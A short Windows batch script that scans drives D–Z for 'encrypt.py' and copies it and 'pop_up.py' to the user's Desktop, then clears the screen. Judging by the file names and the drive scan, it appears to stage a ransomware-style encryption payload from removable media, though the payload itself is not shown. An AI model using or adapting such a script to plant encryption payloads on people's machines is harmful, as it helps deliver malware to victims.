@echo off
:: Minimize window
start /min cmd /c "echo Minimized window"

:: Detect the correct source drive
SET TARGET_FILE=encrypt.py
SET SOURCE_DRIVE=

:: Loop through drives to find the source drive
FOR %%D IN (D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (
    IF EXIST %%D:\%TARGET_FILE% (
        SET SOURCE_DRIVE=%%D:
        GOTO :FOUND
    )
)

:: If no source drive is found, exit with a message
echo No source drive found containing %TARGET_FILE%.
pause
exit /B

:FOUND
echo Source drive found: %SOURCE_DRIVE%

:: Define the target directory on the Desktop
SET TARGET_DIR=%USERPROFILE%\Desktop

:: Copy files from SOURCE_DRIVE to Desktop
xcopy "%SOURCE_DRIVE%\encrypt.py" "%TARGET_DIR%" /Y
xcopy "%SOURCE_DRIVE%\pop_up.py" "%TARGET_DIR%" /Y

:: Optional: Confirmation message
echo Files transferred to Desktop successfully.

:: Clear the screen
cls